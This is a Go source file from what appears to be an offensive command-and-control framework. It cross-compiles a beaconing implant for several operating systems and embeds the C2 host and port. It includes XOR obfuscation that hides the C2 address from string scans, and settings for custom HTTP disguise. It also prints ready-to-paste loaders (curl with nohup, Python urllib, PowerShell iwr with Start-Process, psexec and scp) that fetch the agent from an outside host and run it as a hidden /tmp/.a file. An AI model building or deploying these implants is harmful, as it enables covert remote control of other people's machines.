package main

// cmd_generate.go — agent payload generator.
//
// The 'generate' command cross-compiles the alcapwn agent for a target
// platform and injects C2 configuration (LHOST, LPORT, transport, fingerprint)
// at build time via -ldflags.
//
// Requirements:
//   - Go toolchain in PATH (go build)
//   - alcapwn source tree accessible (detected via 'go env GOMOD')
//
// Commands:
//   generate list                                   — list supported targets
//   generate <os> <arch> --lhost X [options]        — build agent binary
//   generate oneliner <os> <arch> --lhost X [...]   — print deploy one-liner
//
// The server fingerprint is pinned by default (from --serverFingerprint set
// at startup).  Pass --no-pin to produce an unpinned agent (dev/CTF only).

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// ── Target table ──────────────────────────────────────────────────────────────

type generateTarget struct {
	GOOS   string
	GOARCH string
	GOARM  string // non-empty only for arm/ARMv7
	Name   string // display + default filename stem
	Ext    string // "" for ELF, ".exe" for Windows PE
}

var generateTargets = []generateTarget{
	{GOOS: "linux", GOARCH: "amd64", Name: "linux-amd64"},
	{GOOS: "linux", GOARCH: "arm64", Name: "linux-arm64"},
	{GOOS: "linux", GOARCH: "arm", GOARM: "7", Name: "linux-armv7"},
	{GOOS: "linux", GOARCH: "386", Name: "linux-i386"},
	{GOOS: "freebsd", GOARCH: "amd64", Name: "freebsd-amd64"},
	{GOOS: "netbsd", GOARCH: "amd64", Name: "netbsd-amd64"},
	{GOOS: "darwin", GOARCH: "amd64", Name: "macos-x86_64"},
	{GOOS: "darwin", GOARCH: "arm64", Name: "macos-aarch64"},
	{GOOS: "windows", GOARCH: "amd64", Name: "windows-amd64", Ext: ".exe"},
	{GOOS: "windows", GOARCH: "386", Name: "windows-i386", Ext: ".exe"},
	{GOOS: "windows", GOARCH: "arm64", Name: "windows-arm64", Ext: ".exe"},
}

// lookupTarget finds a target by GOOS + GOARCH (case-insensitive).
// Also accepts "armv7" as an alias for arm/GOARM=7.
func lookupTarget(goos, goarch string) *generateTarget {
	goos = strings.ToLower(goos)
	goarch = strings.ToLower(goarch)
	if goarch == "armv7" {
		goarch = "arm"
	}
	for i := range generateTargets {
		t := &generateTargets[i]
		if t.GOOS == goos && t.GOARCH == goarch {
			return t
		}
	}
	return nil
}

// ── Options ───────────────────────────────────────────────────────────────────

type generateOpts struct {
	target           *generateTarget
	lhost            string
	lport            string
	transport        string
	interval         string
	jitter           string
	out              string
	noPin            bool
	obfuscate        bool
	httpUA           string
	httpRegisterPath string
	httpBeaconPath   string

	// New: listener-based configuration
	listenerIdx         int    // index of listener to use for C2
	downloadListenerIdx int    // index of listener to use for downloading agent
	downloadPath        string // full download URL path for agent
}

// listenerInfo holds details about an HTTP listener for agent generation.
type listenerInfo struct {
	addr          string
	downloadPath  string // e.g., "/download/a7f3b2/"
	downloadToken string // e.g., "a7f3b2"
	hasDownload   bool
}

// defaultOut returns the default output filename for this build.
func (o *generateOpts) defaultOut() string {
	name := "agent-" + o.target.Name
	if o.transport == "http" {
		name += "-http"
	}
	return name + o.target.Ext
}

// ── Command entry point ───────────────────────────────────────────────────────

func (c *Console) cmdGenerate(args []string) {
	if len(args) == 0 {
		printGenerateUsage()
		return
	}
	switch strings.ToLower(args[0]) {
	case "list":
		printGenerateTargets()
	case "oneliner":
		c.cmdGenerateOneliner(args[1:])
	default:
		c.cmdGenerateBuild(args)
	}
}

// ── Build subcommand ──────────────────────────────────────────────────────────

func (c *Console) cmdGenerateBuild(args []string) {
	opts, ok := parseGenerateArgs(args, c)
	if !ok {
		return
	}

	modRoot, err := findModuleRoot()
	if err != nil {
		fmt.Printf("[!] Cannot locate alcapwn source: %v\n", err)
		fmt.Println("[!] The 'generate' command requires the Go toolchain and source tree.")
		fmt.Println("[!] Run alcapwn from its repository root directory.")
		return
	}

	if opts.out == "" {
		opts.out = opts.defaultOut()
	}

	ldflags := buildGenerateLDFlags(opts, c)
	fmt.Printf("[*] Building agent (%s/%s, %s transport)...\n",
		opts.target.GOOS, opts.target.GOARCH, opts.transport)

	start := time.Now()
	if err := buildAgentBinary(modRoot, opts, ldflags); err != nil {
		fmt.Printf("[!] Build failed:\n%s\n", err)
		return
	}
	elapsed := time.Since(start)

	// Resolve output path (may be relative).
	outPath := opts.out
	if !filepath.IsAbs(outPath) {
		cwd, _ := os.Getwd()
		outPath = filepath.Join(cwd, outPath)
	}

	info, err := os.Stat(outPath)
	if err != nil {
		fmt.Printf("[!] Could not stat output: %v\n", err)
		return
	}

	sizeMB := float64(info.Size()) / 1024 / 1024
	fmt.Printf("[+] %s (%.1f MB) — %.1fs\n", opts.out, sizeMB, elapsed.Seconds())

	// Register the built file for download if we have a download listener
	if opts.downloadPath != "" {
		// Find the listener address to register with
		downloadIdx := opts.downloadListenerIdx
		if downloadIdx == 0 {
			downloadIdx = opts.listenerIdx
		}
		if downloadIdx > 0 {
			info, ok := c.getListenerByIndex(downloadIdx)
			if ok && info.hasDownload {
				if err := c.RegisterDownload(info.addr, opts.out); err != nil {
					fmt.Printf("[!] Failed to register download: %v\n", err)
				}
			}
		}
	}

	fmt.Printf("[*] Beacon: %s://%s:%s | interval=%ss ±%s%%\n",
		opts.transport, opts.lhost, opts.lport, opts.interval, opts.jitter)

	if opts.noPin {
		fmt.Println("[!] WARNING: fingerprint pinning disabled — agent accepts any server key")
	} else if c.opts.serverFingerprint != "" {
		fmt.Printf("[*] Fingerprint pinned: %.16s...\n", c.opts.serverFingerprint)
	} else {
		fmt.Println("[!] No server fingerprint available — agent built without pinning")
	}
	if opts.obfuscate {
		fmt.Println("[*] Obfuscation: enabled (XOR, 16-byte random key)")
	}
	if opts.transport == "http" {
		rp := opts.httpRegisterPath
		if rp == "" {
			rp = "/register"
		}
		bp := opts.httpBeaconPath
		if bp == "" {
			bp = "/beacon/"
		}
		fmt.Printf("[*] HTTP paths: register=%s beacon=%s\n", rp, bp)
		if opts.httpUA != "" {
			fmt.Printf("[*] User-Agent: %s\n", opts.httpUA)
		}
		if rp != "/register" || bp != "/beacon/" {
			fmt.Printf("[!] Start listener: listen http :%s --register %s --beacon %s\n",
				opts.lport, rp, bp)
		}
	}
	if opts.downloadPath != "" {
		fmt.Printf("[*] Download:   %s%s\n", opts.downloadPath, opts.out)
	}
	printDeployHint(opts.out, opts.target, opts.downloadPath)
}

// ── Oneliner subcommand ───────────────────────────────────────────────────────

func (c *Console) cmdGenerateOneliner(args []string) {
	opts, ok := parseGenerateArgs(args, c)
	if !ok {
		return
	}

	if opts.out == "" {
		opts.out = opts.defaultOut()
	}

	// Use download URL from listener config if available, otherwise fallback
	var agentURL string
	if opts.downloadPath != "" {
		agentURL = opts.downloadPath + opts.out
	} else if opts.lhost != "" {
		// Fallback to old behavior
		agentURL = fmt.Sprintf("http://%s:8000/%s", opts.lhost, opts.out)
		fmt.Println("[!] No download listener configured - using fallback port 8000")
		fmt.Println("[!] Use --listener to use the listener's download URL")
	} else {
		fmt.Println("[!] No listener configured - cannot generate oneliner")
		fmt.Println("[!] Use --listener <index> with an HTTP listener that has --download-dir")
		return
	}

	switch opts.target.GOOS {
	case "windows":
		fmt.Println("[*] Windows — PowerShell:")
		fmt.Printf("    $p=\"$env:TEMP\\%s\"; iwr '%s' -OutFile $p; Start-Process $p\n",
			opts.out, agentURL)
	default:
		fmt.Println("[*] Linux / macOS — curl:")
		fmt.Printf("    curl -fsSL '%s' -o /tmp/.a && chmod +x /tmp/.a && nohup /tmp/.a &\n", agentURL)
		fmt.Println()
		fmt.Println("[*] Linux / macOS — Python (no curl):")
		fmt.Printf("    python3 -c \"import urllib.request,os,subprocess; urllib.request.urlretrieve('%s','/tmp/.a'); os.chmod('/tmp/.a',0o755); subprocess.Popen(['/tmp/.a'])\"\n", agentURL)
	}

	if opts.downloadPath == "" {
		fmt.Printf("\n[*] Serve binary with:  python3 -m http.server 8000  (in the directory containing %s)\n", opts.out)
	}
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// parseGenerateArgs parses "<os> <arch> [flags...]" from args.
func parseGenerateArgs(args []string, c *Console) (generateOpts, bool) {
	if len(args) < 2 {
		printGenerateUsage()
		return generateOpts{}, false
	}

	target := lookupTarget(args[0], args[1])
	if target == nil {
		fmt.Printf("[!] Unsupported target: %s/%s\n", args[0], args[1])
		fmt.Println("[!] Run 'generate list' to see supported targets.")
		return generateOpts{}, false
	}

	opts := generateOpts{
		target:    target,
		lport:     "443",
		transport: "", // will be inferred from listener or default to tcp
		interval:  "60",
		jitter:    "20",
	}

	rest := args[2:]
	for i := 0; i < len(rest); i++ {
		switch rest[i] {
		case "--lhost":
			if i+1 >= len(rest) {
				fmt.Println("[!] --lhost requires a value")
				return generateOpts{}, false
			}
			i++
			opts.lhost = rest[i]
		case "--lport":
			if i+1 >= len(rest) {
				fmt.Println("[!] --lport requires a value")
				return generateOpts{}, false
			}
			i++
			opts.lport = rest[i]
		case "--transport":
			if i+1 >= len(rest) {
				fmt.Println("[!] --transport requires 'tcp' or 'http'")
				return generateOpts{}, false
			}
			i++
			opts.transport = rest[i]
			if opts.transport != "tcp" && opts.transport != "http" {
				fmt.Printf("[!] --transport must be 'tcp' or 'http', got %q\n", opts.transport)
				return generateOpts{}, false
			}
		case "--interval":
			if i+1 >= len(rest) {
				fmt.Println("[!] --interval requires a value")
				return generateOpts{}, false
			}
			i++
			opts.interval = rest[i]
		case "--jitter":
			if i+1 >= len(rest) {
				fmt.Println("[!] --jitter requires a value")
				return generateOpts{}, false
			}
			i++
			opts.jitter = rest[i]
		case "--out":
			if i+1 >= len(rest) {
				fmt.Println("[!] --out requires a filename")
				return generateOpts{}, false
			}
			i++
			opts.out = rest[i]
		case "--no-pin":
			opts.noPin = true
		case "--obfuscate":
			opts.obfuscate = true
		case "--http-ua":
			if i+1 >= len(rest) {
				fmt.Println("[!] --http-ua requires a value")
				return generateOpts{}, false
			}
			i++
			opts.httpUA = rest[i]
		case "--http-register-path":
			if i+1 >= len(rest) {
				fmt.Println("[!] --http-register-path requires a value")
				return generateOpts{}, false
			}
			i++
			opts.httpRegisterPath = rest[i]
		case "--http-beacon-path":
			if i+1 >= len(rest) {
				fmt.Println("[!] --http-beacon-path requires a value")
				return generateOpts{}, false
			}
			i++
			opts.httpBeaconPath = rest[i]
		case "--listener":
			if i+1 >= len(rest) {
				fmt.Println("[!] --listener requires an index")
				return generateOpts{}, false
			}
			i++
			idx, err := strconv.Atoi(rest[i])
			if err != nil || idx < 1 {
				fmt.Printf("[!] Invalid listener index: %s\n", rest[i])
				return generateOpts{}, false
			}
			opts.listenerIdx = idx
		case "--download-listener":
			if i+1 >= len(rest) {
				fmt.Println("[!] --download-listener requires an index")
				return generateOpts{}, false
			}
			i++
			idx, err := strconv.Atoi(rest[i])
			if err != nil || idx < 1 {
				fmt.Printf("[!] Invalid listener index: %s\n", rest[i])
				return generateOpts{}, false
			}
			opts.downloadListenerIdx = idx
		default:
			fmt.Printf("[!] Unknown flag: %s\n", rest[i])
			printGenerateUsage()
			return generateOpts{}, false
		}
	}

	// If --listener is provided, look up C2 info from that listener
	if opts.listenerIdx > 0 {
		info, ok := c.getListenerByIndex(opts.listenerIdx)
		if !ok {
			fmt.Printf("[!] Invalid listener index: %d\n", opts.listenerIdx)
			return generateOpts{}, false
		}
		opts.lhost, opts.lport, _ = splitHostPort(info.addr)
		// If transport not specified, infer from listener type
		if opts.transport == "" {
			opts.transport = "http"
		}
	}

	// Default to TCP if transport was not inferred from a listener or set explicitly.
	if opts.transport == "" {
		opts.transport = "tcp"
	}

	// Validate: HTTP transport requires listener for proper config
	if opts.transport == "http" && opts.listenerIdx == 0 && opts.lhost == "" {
		fmt.Println("[!] HTTP transport requires --listener (or --lhost/--lport for manual config)")
		return generateOpts{}, false
	}

	// If using --listener but didn't specify lhost, we're good
	// Otherwise require lhost
	if opts.lhost == "" && opts.listenerIdx == 0 {
		fmt.Println("[!] --lhost or --listener is required")
		printGenerateUsage()
		return generateOpts{}, false
	}

	// Look up download listener if needed
	if opts.listenerIdx > 0 || opts.downloadListenerIdx > 0 {
		downloadIdx := opts.downloadListenerIdx
		if downloadIdx == 0 {
			downloadIdx = opts.listenerIdx
		}
		info, ok := c.getListenerByIndex(downloadIdx)
		if !ok {
			fmt.Printf("[!] Invalid download listener index: %d\n", downloadIdx)
			return generateOpts{}, false
		}
		if !info.hasDownload {
			fmt.Printf("[!] Listener %d does not have download enabled (--download-dir)\n", downloadIdx)
			fmt.Printf("[!] Use a different listener or serve the agent manually\n")
			return generateOpts{}, false
		}
		opts.downloadPath = fmt.Sprintf("http://%s%s", info.addr, info.downloadPath)
	}

	return opts, true
}

// getListenerByIndex returns listener info by index (1-based from 'listeners' command).
// Ordering matches cmdListeners: TCP listeners first (sorted by addr), then HTTP listeners.
func (c *Console) getListenerByIndex(idx int) (listenerInfo, bool) {
	var infos []listenerInfo

	// TCP listeners first.
	for _, e := range c.listeners.all() {
		infos = append(infos, listenerInfo{
			addr:        e.addr,
			hasDownload: false,
		})
	}

	// HTTP listeners — acquire lock once for the entire iteration.
	c.httpListeners.mu.Lock()
	for addr, e := range c.httpListeners.listeners {
		info := listenerInfo{addr: addr}
		if e != nil {
			info.hasDownload = e.downloadDir != ""
			info.downloadToken = e.downloadToken
			info.downloadPath = e.downloadPath
		}
		infos = append(infos, info)
	}
	c.httpListeners.mu.Unlock()

	if idx < 1 || idx > len(infos) {
		return listenerInfo{}, false
	}
	return infos[idx-1], true
}

// splitHostPort splits "host:port" into host and port parts.
func splitHostPort(addr string) (host, port string, err error) {
	parts := strings.Split(addr, ":")
	if len(parts) < 2 {
		return "", "", fmt.Errorf("invalid address: %s", addr)
	}
	host = strings.Join(parts[:len(parts)-1], ":")
	port = parts[len(parts)-1]
	return host, port, nil
}

// buildGenerateLDFlags constructs the -ldflags string for the agent binary.
// When opts.obfuscate is set, sensitive config strings are XOR-encoded with a
// random per-build key; the plain vars are cleared so only enc variants work.
func buildGenerateLDFlags(opts generateOpts, c *Console) string {
	fp := ""
	if !opts.noPin {
		fp = c.opts.serverFingerprint
	}

	var flags []string

	// HTTP customisation flags (always plain — not security-sensitive).
	if opts.httpUA != "" {
		flags = append(flags, fmt.Sprintf("-X 'main.httpUA=%s'", opts.httpUA))
	}
	if opts.httpRegisterPath != "" {
		flags = append(flags, fmt.Sprintf("-X main.httpRegisterPath=%s", opts.httpRegisterPath))
	}
	if opts.httpBeaconPath != "" {
		flags = append(flags, fmt.Sprintf("-X main.httpBeaconPath=%s", opts.httpBeaconPath))
	}

	if opts.obfuscate {
		key := xorGenKey(16) // 16 random bytes
		keyHex := hex.EncodeToString(key)
		flags = append(flags,
			fmt.Sprintf("-X main.xorKey=%s", keyHex),
			// Encoded sensitive values.
			fmt.Sprintf("-X main.lhostEnc=%s", xorEncodeStr(opts.lhost, key)),
			fmt.Sprintf("-X main.lportEnc=%s", xorEncodeStr(opts.lport, key)),
			fmt.Sprintf("-X main.transportEnc=%s", xorEncodeStr(opts.transport, key)),
			fmt.Sprintf("-X main.intervalEnc=%s", xorEncodeStr(opts.interval, key)),
			fmt.Sprintf("-X main.jitterEnc=%s", xorEncodeStr(opts.jitter, key)),
			// Clear plain vars so they don't appear in strings output.
			"-X main.lhost=",
			"-X main.lport=",
			"-X main.transport=",
			"-X main.interval=",
			"-X main.jitter=",
		)
		if fp != "" {
			flags = append(flags,
				fmt.Sprintf("-X main.serverFingerprintEnc=%s", xorEncodeStr(fp, key)),
				"-X main.serverFingerprint=",
			)
		}
	} else {
		flags = append(flags,
			fmt.Sprintf("-X main.lhost=%s", opts.lhost),
			fmt.Sprintf("-X main.lport=%s", opts.lport),
			fmt.Sprintf("-X main.transport=%s", opts.transport),
			fmt.Sprintf("-X main.interval=%s", opts.interval),
			fmt.Sprintf("-X main.jitter=%s", opts.jitter),
		)
		if fp != "" {
			flags = append(flags, fmt.Sprintf("-X main.serverFingerprint=%s", fp))
		}
	}

	return strings.Join(flags, " ")
}

// ── XOR helpers (server-side only) ───────────────────────────────────────────

// xorGenKey generates n cryptographically random bytes for use as a XOR key.
func xorGenKey(n int) []byte {
	key := make([]byte, n)
	if _, err := rand.Read(key); err != nil {
		panic("rand.Read: " + err.Error())
	}
	return key
}

// xorEncodeStr XOR-encodes s with key and returns the result as a lowercase hex string.
func xorEncodeStr(s string, key []byte) string {
	b := []byte(s)
	for i := range b {
		b[i] ^= key[i%len(key)]
	}
	return hex.EncodeToString(b)
}

// buildAgentBinary runs go build for the agent with the given options.
func buildAgentBinary(modRoot string, opts generateOpts, ldflags string) error {
	// Resolve output to an absolute path so it lands in CWD regardless of
	// where go build is invoked from (modRoot may differ from CWD).
	outPath := opts.out
	if !filepath.IsAbs(outPath) {
		cwd, err := os.Getwd()
		if err != nil {
			return fmt.Errorf("getwd: %w", err)
		}
		outPath = filepath.Join(cwd, outPath)
	}

	env := append(os.Environ(),
		"CGO_ENABLED=0",
		"GOOS="+opts.target.GOOS,
		"GOARCH="+opts.target.GOARCH,
	)
	if opts.target.GOARM != "" {
		env = append(env, "GOARM="+opts.target.GOARM)
	}

	var stderr bytes.Buffer
	cmd := exec.Command("go", "build",
		"-buildvcs=false",
		"-ldflags", ldflags+" -s -w",
		"-o", outPath,
		"./agent/",
	)
	cmd.Dir = modRoot
	cmd.Env = env
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		if stderr.Len() > 0 {
			return fmt.Errorf("%v\n%s", err, strings.TrimSpace(stderr.String()))
		}
		return err
	}
	return nil
}

// findModuleRoot locates the alcapwn module root directory by asking the Go
// toolchain where the current go.mod lives.  Returns an error if the Go
// toolchain is not in PATH or alcapwn is not running from its source tree.
func findModuleRoot() (string, error) {
	out, err := exec.Command("go", "env", "GOMOD").Output()
	if err != nil {
		return "", fmt.Errorf("go toolchain not in PATH: %w", err)
	}
	modFile := strings.TrimSpace(string(out))
	if modFile == "" || modFile == os.DevNull {
		return "", fmt.Errorf("not inside a Go module; run alcapwn from its source directory")
	}
	dir := filepath.Dir(modFile)
	// Sanity-check: the module must contain an agent/ subdirectory.
	if _, err := os.Stat(filepath.Join(dir, "agent")); os.IsNotExist(err) {
		return "", fmt.Errorf("module at %s has no agent/ directory (wrong source tree?)", dir)
	}
	return dir, nil
}

// printDeployHint prints a copy+paste deploy snippet for the built binary.
func printDeployHint(outFile string, t *generateTarget, downloadURL string) {
	switch t.GOOS {
	case "windows":
		fmt.Printf("[*] Deploy: copy %s target && psexec \\\\target cmd /c %s\n", outFile, outFile)
	case "darwin":
		fmt.Printf("[*] Deploy: scp %s user@target:/tmp/.a && ssh user@target '/tmp/.a &'\n", outFile)
	default: // linux, freebsd, netbsd
		fmt.Printf("[*] Deploy: scp %s user@target:/tmp/.a && ssh user@target 'chmod +x /tmp/.a && /tmp/.a &'\n", outFile)
	}
}

// ── Display helpers ───────────────────────────────────────────────────────────

func printGenerateTargets() {
	fmt.Printf("  %-20s  %-9s  %-8s  %s\n", "Name", "GOOS", "GOARCH", "Notes")
	fmt.Printf("  %-20s  %-9s  %-8s  %s\n",
		strings.Repeat("─", 20), strings.Repeat("─", 9),
		strings.Repeat("─", 8), strings.Repeat("─", 10))
	for _, t := range generateTargets {
		var notes []string
		if t.GOARM != "" {
			notes = append(notes, "GOARM="+t.GOARM)
		}
		if t.Ext != "" {
			notes = append(notes, "PE binary")
		}
		fmt.Printf("  %-20s  %-9s  %-8s  %s\n",
			t.Name, t.GOOS, t.GOARCH, strings.Join(notes, ", "))
	}
}

func printGenerateUsage() {
	fmt.Print(`Usage:
  generate list
  generate <os> <arch> --lhost <host> [options]
  generate oneliner <os> <arch> --lhost <host> [options]

Options:
  --lhost <host>             C2 listener IP or hostname (required)
  --lport <port>             listener port (default: 443)
  --transport <t>            tcp or http (default: tcp)
  --interval <s>      beacon interval in seconds (default: 60)
  --jitter <pct>      jitter percentage 0–50 (default: 20)
  --out <file>        output filename (default: agent-<target>[-http][.exe])
  --no-pin                   omit certificate pinning (dev/CTF testing only)
  --obfuscate                XOR-encode config strings (hides C2 IP from strings(1))
  --http-ua <ua>             custom User-Agent header for HTTP transport
  --http-register-path <p>   server registration URI (default: /register)
  --http-beacon-path <p>     server beacon URI prefix (default: /beacon/)

Examples:
  generate linux amd64 --lhost 10.0.0.1
  generate linux amd64 --lhost 10.0.0.1 --transport http --obfuscate
  generate linux amd64 --lhost 10.0.0.1 --transport http \
    --http-register-path /api/v1/status --http-beacon-path /cdn/
  generate windows amd64 --lhost 10.0.0.1 --out beacon.exe --obfuscate
  generate oneliner linux amd64 --lhost 10.0.0.1
`)
}
